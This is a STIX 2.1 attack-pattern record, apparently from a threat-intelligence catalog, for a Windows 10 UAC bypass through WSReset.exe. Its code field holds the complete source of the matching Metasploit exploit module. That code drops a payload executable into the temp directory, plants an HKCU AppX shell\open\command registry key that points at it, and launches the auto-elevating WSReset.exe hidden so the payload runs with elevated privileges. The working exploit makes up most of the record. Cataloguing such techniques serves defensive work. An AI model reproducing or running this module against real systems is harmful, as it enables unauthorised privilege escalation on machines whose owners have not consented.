{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a1f873d8-4fe3-495c-817b-c457327882e3",
    "created": "2024-08-14T16:48:59.326748Z",
    "modified": "2024-08-14T16:48:59.326752Z",
    "name": "Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe) and Registry",
    "description": " This module exploits a flaw in the WSReset.exe file associated with the Windows Store.  This binary has autoelevate privs, and it will run a binary file contained in a low-privilege registry location.  By placing a link to the binary in the registry location, WSReset.exe will launch the binary as a privileged user.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/bypassuac_windows_store_reg.rb",
            "external_id": "bypassuac_windows_store_reg.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.activecyber.us/activelabs/windows-uac-bypass"
        },
        {
            "source_name": "reference",
            "url": "https://heynowyouseeme.blogspot.com/2019/08/windows-10-lpe-uac-bypass-in-windows.html"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/sailay1996/UAC_bypass_windows_store"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ManualRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Post::Windows::Priv\n  include Post::Windows::Runas\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe) and Registry',\n        'Description' => %q{\n          This module exploits a flaw in the WSReset.exe file associated with the Windows\n          Store.  This binary has autoelevate privs, and it will run a binary file\n          contained in a low-privilege registry location.  By placing a link to\n          the binary in the registry location, WSReset.exe will launch the binary as\n          a privileged user.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'ACTIVELabs',   # discovery\n          'sailay1996',   # poc\n          'bwatters-r7',  # metasploit module\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Targets' => [[ 'Automatic', {} ]],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'WfsDelay' => 15\n        },\n        'DisclosureDate' => '2019-02-19',\n        'Notes' => {\n          'SideEffects' => [ ARTIFACTS_ON_DISK, SCREEN_EFFECTS ]\n        },\n        'References' => [\n          ['URL', 'https://www.activecyber.us/activelabs/windows-uac-bypass'],\n          ['URL', 'https://heynowyouseeme.blogspot.com/2019/08/windows-10-lpe-uac-bypass-in-windows.html'],\n          ['URL', 'https://github.com/sailay1996/UAC_bypass_windows_store'],\n        ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_getenv\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n    register_options(\n      [OptString.new('PAYLOAD_NAME', [false, 'The filename to use for the payload binary (%RAND% by default).', nil])]\n    )\n  end\n\n  def check\n    version = get_version_info\n    if version.build_number >= Msf::WindowsVersion::Win10_InitialRelease && !version.windows_server? && is_uac_enabled? && exists?('C:\\\\Windows\\\\System32\\\\WSReset.exe')\n      return CheckCode::Appears\n    end\n\n    CheckCode::Safe\n  end\n\n  def exploit\n    @registry_key = ''\n    check_permissions!\n    case get_uac_level\n    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,\n      UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,\n      UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT\n      fail_with(Failure::NotVulnerable,\n                \"UAC is set to 'Always Notify'. This module does not bypass this setting, exiting...\")\n    when UAC_DEFAULT\n      print_good('UAC is set to Default')\n      print_good('BypassUAC can bypass this setting, continuing...')\n    when UAC_NO_PROMPT\n      print_warning('UAC set to DoNotPrompt - using ShellExecute \"runas\" method instead')\n      shell_execute_exe\n      return\n    end\n\n    # get directory locations straight\n    win_dir = session.sys.config.getenv('windir')\n    vprint_status('win_dir = ' + win_dir)\n    tmp_dir = session.sys.config.getenv('tmp')\n    vprint_status('tmp_dir = ' + tmp_dir)\n    exploit_dir = win_dir + '\\\\System32\\\\'\n    vprint_status('exploit_dir = ' + exploit_dir)\n    reset_filepath = exploit_dir + 'WSReset.exe'\n    vprint_status('exploit_file = ' + reset_filepath)\n\n    # make payload\n    payload_name = datastore['PAYLOAD_NAME'] || Rex::Text.rand_text_alpha(rand(6..13)) + '.exe'\n    payload_pathname = tmp_dir + '\\\\' + payload_name\n    vprint_status('payload_pathname = ' + payload_pathname)\n    vprint_status('Making Payload')\n    payload = generate_payload_exe\n    reg_command = exploit_dir + \"cmd.exe /c start #{payload_pathname}\"\n    vprint_status(\"reg_command = \" + reg_command)\n    @registry_key = 'HKCU\\\\Software\\\\Classes\\\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\\\Shell\\\\open\\\\command'\n\n    # make registry changes\n    vprint_status(\"Making Registry Changes\")\n    begin\n      registry_createkey(@registry_key)\n      registry_setvaldata(@registry_key, 'DelegateExecute', '', 'REG_SZ')\n      registry_setvaldata(@registry_key, '', reg_command, 'REG_SZ')\n    rescue ::Exception => e\n      print_error(e.to_s)\n    end\n    vprint_status('Registry Changes Complete')\n    # Upload payload\n    vprint_status(\"Uploading Payload to #{payload_pathname}\")\n    write_file(payload_pathname, payload)\n    vprint_status('Payload Upload Complete')\n\n    vprint_status('Launching ' + reset_filepath)\n    begin\n      session.sys.process.execute(\"cmd.exe /c \\\"#{reset_filepath}\\\"\", nil, 'Hidden' => true)\n    rescue ::Exception => e\n      print_error(e.to_s)\n    end\n    print_warning(\"This exploit requires manual cleanup of '#{payload_pathname}'\")\n  end\n\n  def cleanup\n    if @registry_key.present?\n    vprint_status('Removing Registry Changes')\n      registry_deletekey(@registry_key)\n    vprint_status('Registry Changes Removed')\n    end\n  end\n\n  def check_permissions!\n    unless check == Exploit::CheckCode::Appears\n      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')\n    end\n    fail_with(Failure::None, 'Already in elevated state') if is_admin? || is_system?\n    # Check if you are an admin\n    # is_in_admin_group can be nil, true, or false\n    print_status('UAC is Enabled, checking level...')\n    vprint_status('Checking admin status...')\n    admin_group = is_in_admin_group?\n    if admin_group.nil?\n      print_error('Either whoami is not there or failed to execute')\n      print_error('Continuing under assumption you already checked...')\n    elsif admin_group\n      print_good('Part of Administrators group! Continuing...')\n    else\n      fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')\n    end\n\n    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]\n      fail_with(Failure::NoAccess, 'Cannot BypassUAC from Low Integrity Level')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-02-19",
    "x_mitre_platforms": [
        "['win']"
    ]
}